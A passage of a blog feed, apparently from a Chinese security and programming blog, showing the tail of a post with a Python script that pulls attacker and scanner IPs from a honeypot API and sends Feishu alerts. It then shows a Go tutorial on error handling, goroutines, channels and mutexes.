class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> warnings<br><br><span class="hljs-comment"># 忽略警告</span><br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><span class="hljs-comment"># 获取当前脚本所在的目录</span><br>script_dir = os.path.dirname(os.path.realpath(__file__))<br><br><span class="hljs-comment"># 设置日志</span><br>logging.basicConfig(level=logging.INFO, <span class="hljs-built_in">format</span>=<span class="hljs-string">&quot;%(message)s&quot;</span>)<br>logger = logging.getLogger(__name__)<br><br><span class="hljs-comment"># 配置选项</span><br>RESULT_DIR = os.path.join(script_dir, <span class="hljs-string">&quot;result&quot;</span>)<br><br><span class="hljs-comment"># 检查并创建结果目录</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(RESULT_DIR):<br>    os.makedirs(RESULT_DIR)<br>    <br>BASE_URL = <span class="hljs-string">&quot;https://蜜罐的API链接&quot;</span>  <span class="hljs-comment"># 此处为蜜罐的API</span><br>HEADERS = &#123;<span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>&#125;<br>THREAT_LABELS_ATTACK = [<br>    <span class="hljs-string">&quot;IDC&quot;</span>,<br>    <span class="hljs-string">&quot;Spam&quot;</span>,<br>    <span class="hljs-string">&quot;Zombie&quot;</span>,<br>    <span class="hljs-string">&quot;Exploit&quot;</span>,<br>    <span class="hljs-string">&quot;Edu&quot;</span>,<br>    <span class="hljs-string">&quot;BTtracker&quot;</span>,<br>    <span class="hljs-string">&quot;Backbone&quot;</span>,<br>]<br>THREAT_LABELS_SCANNER = [<span class="hljs-string">&quot;Scanner&quot;</span>, <span class="hljs-string">&quot;Botnet&quot;</span>, <span class="hljs-string">&quot;uspicious&quot;</span>, <span class="hljs-string">&quot;Mobile&quot;</span>]<br>IP_REGEX_PATTERN = <span class="hljs-string">r&quot;\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_data</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.post(BASE_URL, headers=HEADERS, data=payload, verify=<span class="hljs-literal">False</span>)<br>        response.raise_for_status()<br>        <span class="hljs-keyword">return</span> response.text<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        logger.error(<span class="hljs-string">f&quot;Error fetching data: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">match_ips</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> re.findall(IP_REGEX_PATTERN, data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_new_ips</span>(<span class="hljs-params">old_ips, new_ips</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(new_ips) - <span class="hljs-built_in">set</span>(old_ips))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_ips_to_file</span>(<span class="hljs-params">file_path, ips</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(<span class="hljs-string">&quot;\n&quot;</span>.join(ips))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_notification</span>(<span class="hljs-params">webhook_url, content</span>):<br>    headers = &#123;<span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>, <span class="hljs-string">&quot;Charset&quot;</span>: <span class="hljs-string">&quot;UTF-8&quot;</span>&#125;<br>    message = &#123;<span class="hljs-string">&quot;msg_type&quot;</span>: <span class="hljs-string">&quot;text&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: &#123;<span class="hljs-string">&quot;text&quot;</span>: content&#125;&#125;<br>    response = requests.post(url=webhook_url, headers=headers, data=json.dumps(message))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    attack_webhook = (<br>        <span class="hljs-string">&quot;https://open.feishu.cn/open-apis/bot/v2/hook/xxxx&quot;</span>  <span class="hljs-comment"># 接收攻击告警机器人的 webhook</span><br>    )<br>    scan_webhook = (<br>        <span class="hljs-string">&quot;https://open.feishu.cn/open-apis/bot/v2/hook/xxxxx&quot;</span>  <span class="hljs-comment"># 接收扫描告警机器人的 webhook</span><br>    )<br><br>    payload_attacker = json.dumps(<br>        &#123;<br>            <span class="hljs-string">&quot;start_time&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;end_time&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;intranet&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;source&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;threat_label&quot;</span>: THREAT_LABELS_ATTACK,<br>        &#125;<br>    )<br>    payload_scanner = json.dumps(<br>        &#123;<br>            <span class="hljs-string">&quot;start_time&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;end_time&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;intranet&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;source&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;threat_label&quot;</span>: THREAT_LABELS_SCANNER,<br>        &#125;<br>    )<br><br>    attack_data = fetch_data(payload_attacker)<br>    scanner_data = fetch_data(payload_scanner)<br><br>    attacker_ips = match_ips(attack_data)<br>    scanner_ips = match_ips(scanner_data)<br><br>    attacker_ips_path = os.path.join(RESULT_DIR, <span class="hljs-string">&quot;attack_ips.txt&quot;</span>)<br>    scan_ips_path = os.path.join(RESULT_DIR, <span class="hljs-string">&quot;scan_ips.txt&quot;</span>)<br><br>    previous_attacker_ips = []<br>    previous_scan_ips = []<br><br>    <span class="hljs-keyword">if</span> os.path.exists(attacker_ips_path):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(attacker_ips_path, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>            previous_attacker_ips = file.read().splitlines()<br><br>    <span class="hljs-keyword">if</span> os.path.exists(scan_ips_path):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(scan_ips_path, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>            previous_scan_ips = file.read().splitlines()<br><br>    new_attack_ips = find_new_ips(previous_attacker_ips, attacker_ips)<br>    new_scan_ips = find_new_ips(previous_scan_ips, scanner_ips)<br><br>    write_ips_to_file(attacker_ips_path, attacker_ips)<br><br>    <span class="hljs-keyword">if</span> new_attack_ips:<br>        logger.info(<span class="hljs-string">&quot;有憨包踩蜜罐咯，尝试下溯源吧! hacking!&quot;</span>)<br>        logger.info(<span class="hljs-string">&quot;\n&quot;</span>.join(new_attack_ips))<br>        attack_content = <span class="hljs-string">&quot;有憨包踩蜜罐咯，尝试下溯源吧! hacking!\n&quot;</span> + <span class="hljs-string">&quot;\n&quot;</span>.join(new_attack_ips)<br>    <span class="hljs-keyword">else</span>:<br>        logger.info(<span class="hljs-string">&quot;还没新的憨包踩到蜜罐! 请静待有缘人&quot;</span>)<br>        attack_content = <span class="hljs-string">&quot;还没新的憨包踩到蜜罐! 请静待有缘人\n&quot;</span><br><br>    write_ips_to_file(scan_ips_path, scanner_ips)<br><br>    <span class="hljs-keyword">if</span> new_scan_ips:<br>        logger.info(<span class="hljs-string">&quot;快把这些扫描器、爬虫封了！&quot;</span>)<br>        logger.info(<span class="hljs-string">&quot;\n&quot;</span>.join(new_scan_ips))<br>        scan_content = <span class="hljs-string">&quot;快把这些扫描器、爬虫封了！\n&quot;</span> + <span class="hljs-string">&quot;\n&quot;</span>.join(new_scan_ips)<br>    <span class="hljs-keyword">else</span>:<br>        logger.info(<span class="hljs-string">&quot;目前没得需要封禁的IP&quot;</span>)<br>        scan_content = <span class="hljs-string">&quot;目前没得需要封禁的IP\n&quot;</span><br><br>    send_notification(attack_webhook, attack_content)<br>    send_notification(scan_webhook, scan_content)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>将代码放置你的云主机服务器上，使用crontab设置定时任务即可。</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309011444748.png" alt="飞书机器人告警效果"></p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202309011444193.png" alt="飞书机器人实现效果"></p><h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h2><ol><li><a href="http://tttang.com/archive/1832">http://tttang.com/archive/1832</a> [企业蜜罐建设实践]</li><li><a href="https://www.anquanke.com/post/id/227833#h2-12">https://www.anquanke.com/post/id/227833#h2-12</a> [浅析开源蜜罐识别与全网测绘]</li><li><a href="https://waf-ce.chaitin.cn/">https://waf-ce.chaitin.cn/</a> [长亭雷池WAF社区版]</li><li><a href="https://hfish.net/">https://hfish.net/</a>  [开源 HFish 蜜罐] </li><li><a href="https://rivers.chaitin.cn/app/collie/home">https://rivers.chaitin.cn/app/collie/home</a>  [牧云主机管理助手]</li><li><a href="https://docs.rivers.chaitin.cn/">https://docs.rivers.chaitin.cn</a>  [长亭百川云平台]</li></ol>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WAF 蜜罐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go语言基础学习（五）</title>
    <link href="/2023/08/26/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2023/08/26/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Go-语言中的错误和异常处理"><a href="#Go-语言中的错误和异常处理" class="headerlink" title="Go 语言中的错误和异常处理"></a>Go 语言中的错误和异常处理</h1><h2 id="1-error-接口"><a href="#1-error-接口" class="headerlink" title="1.error 接口"></a>1.error 接口</h2><p>error 是<strong>系统自带</strong>的一个接口类型的自定义类型。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> <span class="hljs-type">error</span> <span class="hljs-keyword">interface</span> &#123;<br>    Error() <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-errors-包"><a href="#2-errors-包" class="headerlink" title="2.errors 包"></a>2.errors 包</h2><p>errors 包中包含了一个实现 error 这个接口的结构体类型 errorString。可以直接使用包中的方法来自定义一些错误，从而返回希望被上层代码处理的错误信息</p><p>试例代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;errors&quot;</span><br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    t, err := divide(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Println(err)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        fmt.Println(t)<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">divide</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;<br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, errors.New(<span class="hljs-string">&quot;除数不能为0&quot;</span>)<br>    &#125;<br>    <span class="hljs-keyword">return</span> a / b, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-异常处理"><a href="#3-异常处理" class="headerlink" title="3.异常处理"></a>3.异常处理</h2><p>如果调用的方法的开发者不够仔细，并没有将所有的异常都考虑到并作为错误返回，那么程序可能就会<strong>被其影响而崩溃</strong>，GO 语言提供了一个叫<code>recover()</code>的函数，用于处理这种问题。一般常用于服务启动的入口函数，因为网络等外部因素，极有可能会导致程序异常，这些异常就需要这个函数来捕获。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        err := <span class="hljs-built_in">recover</span>()<br>        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;程序运行中出现异常：&quot;</span>, err)<br>        &#125;<br>    &#125;()<br>    t := divide(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>)<br>    fmt.Println(t)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">divide</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>    <span class="hljs-keyword">return</span> a / b<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Go-语言的并发"><a href="#Go-语言的并发" class="headerlink" title="Go 语言的并发"></a>Go 语言的并发</h1><p>Go 语言中的<strong>多线程操</strong>作是其语言的一大特色，它具有其它语言无法比拟的，可以近乎<strong>无限开启的线程</strong>。在 Go 语言中被称之为 <strong>goroutine</strong> ，它是线程的<strong>轻量级实现</strong>。</p><h2 id="1-Go-语言的-goroutine"><a href="#1-Go-语言的-goroutine" class="headerlink" title="1.Go 语言的 goroutine"></a>1.Go 语言的 goroutine</h2><p>在 Go 语言中使用 <strong>go</strong> 关键字来创建 goroutine ，形如<code>go 函数名()</code>的形式去创建。<strong>每一个 goroutine 必须是一个函数，这个函数也可以是匿名函数</strong>。</p><p>代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//打印0到10的数字</span><br>    <span class="hljs-keyword">go</span> print0to10()<br>    <span class="hljs-comment">//打印A到Z的字符</span><br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        <span class="hljs-keyword">for</span> i := <span class="hljs-string">&#x27;A&#x27;</span>; i &lt;= <span class="hljs-string">&#x27;K&#x27;</span>; i++ &#123;<br>            fmt.Println(<span class="hljs-string">&quot;printAtoK:&quot;</span>, <span class="hljs-type">string</span>(i))<br>            time.Sleep(time.Microsecond)<br>        &#125;<br>    &#125;()<br>    time.Sleep(time.Second)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">print0to10</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">10</span>; i++ &#123;<br>        fmt.Println(<span class="hljs-string">&quot;print0to10:&quot;</span>, i)<br>        time.Sleep(time.Microsecond)<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行结果<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308262137030.png" alt="image.png"><br>从执行结果中可以看出打印数字和打印字符的两个 goroutine 是并发执行的。执行顺序是由 cpu 来调度的，所以执行结果可能每次都不一样。</p><h2 id="2-Go语言并发通讯"><a href="#2-Go语言并发通讯" class="headerlink" title="2.  Go语言并发通讯"></a>2.  Go语言并发通讯</h2><p>其它语言并发时进程中的通讯一般都是通过共享内存(全局变量)的方式来实现的，这样一来各个模块之间的耦合会变得非常紧密。所以后来提出了<strong>使用通讯来共享内存</strong>这一概念，来解耦合。在 Go 语言中就是使用 channel 的方式来达到这一目的的。</p><p>代码实例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> c1 <span class="hljs-keyword">chan</span> <span class="hljs-type">rune</span> = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">rune</span>, <span class="hljs-number">0</span>)<br><span class="hljs-keyword">var</span> c2 <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//打印0到10的数字</span><br>    <span class="hljs-keyword">go</span> print0to10()<br>    <span class="hljs-comment">//打印A到Z的字符</span><br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        c2 &lt;- <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">11</span>; i++ &#123;<br>            char := &lt;-c1<br>            fmt.Println(<span class="hljs-string">&quot;printAtoK:&quot;</span>, <span class="hljs-type">string</span>(char))<br>            c2 &lt;- i<br>        &#125;<br>    &#125;()<br>    time.Sleep(time.Second)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">print0to10</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-string">&#x27;A&#x27;</span>; i &lt;= <span class="hljs-string">&#x27;K&#x27;</span>; i++ &#123;<br>        num := &lt;-c2<br>        fmt.Println(<span class="hljs-string">&quot;print0to10:&quot;</span>, num)<br>        c1 &lt;- i<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308262137055.png" alt="image.png"><br>和没用使用 channel 之前的代码不同，这次等同于使用 channel 实现了 goroutine 的调度，使其轮流执行。</p><h1 id="Go语言进程锁"><a href="#Go语言进程锁" class="headerlink" title="Go语言进程锁"></a>Go语言进程锁</h1><p>之所以线程不安全是因为其内部实现机制中无法同时读写，若有两个 goroutine <strong>一个在读取 map 中的值，而另一个在更新 map 中的值</strong>，就会导致程序崩溃。</p><p>代码示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    m := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;A&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;B&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;C&quot;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&quot;D&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;E&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;F&quot;</span>: <span class="hljs-number">3</span>&#125;<br>    <span class="hljs-comment">//创建100个goroutine对map进行读写</span><br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>            <span class="hljs-keyword">for</span> v := <span class="hljs-keyword">range</span> m &#123;<br>                m[v] = <span class="hljs-number">100</span><br>            &#125;<br>        &#125;()<br>    &#125;<br>    time.Sleep(time.Second)<br>    fmt.Println(m)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行上述代码有时会输出正确结果：</p><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202308262137052.png" alt="image-20230822201432973"></p><p>但更多的时候会输出读写冲突，就是线程不安全的 map 不建议使用的原因，除了直接使用线程安全的 map 之外，还可以为这些 goruntine <strong>加上锁</strong>，使其无法同时对 map 进行读写操作，这样也可以保障各线程的安全。</p><p>代码示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> lock sync.Mutex <span class="hljs-comment">//定义一个锁变量</span><br>m := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;A&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;B&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;C&quot;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&quot;D&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;E&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;F&quot;</span>: <span class="hljs-number">3</span>&#125;<br><span class="hljs-comment">// 创建100个goroutine对map进行读写</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>lock.Lock() <span class="hljs-comment">// 在读取map前锁定这个锁，使其它线程访问这个锁要阻塞</span><br><span class="hljs-keyword">for</span> v := <span class="hljs-keyword">range</span> m &#123;<br>m[v] = <span class="hljs-number">100</span><br>&#125;<br>lock.Unlock() <span class="hljs-comment">//在读取map前释放这个锁</span><br>&#125;()<br>&#125;<br>time.Sleep(time.Second)<br>fmt.Println(m)<br>&#125;<br></code></pre></td></tr></table></figure><p>加了锁之后，无论多少次的执行结果都是正确的。</p><h1 id="Go语言的包"><a href="#Go语言的包" class="headerlink" title="Go语言的包"></a>Go语言的包</h1><p>和大部分语言一致，Go 语言也是支持调用其它文件中的 Go 代码的。<strong>Go 语言是现这一功能则是通过包来实现的</strong>。而实现包的功能则是通过关键字 <strong>package</strong> 来实现的，使用 <strong>package</strong> 来声明代码所在的包。</p><h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h2><p>Go 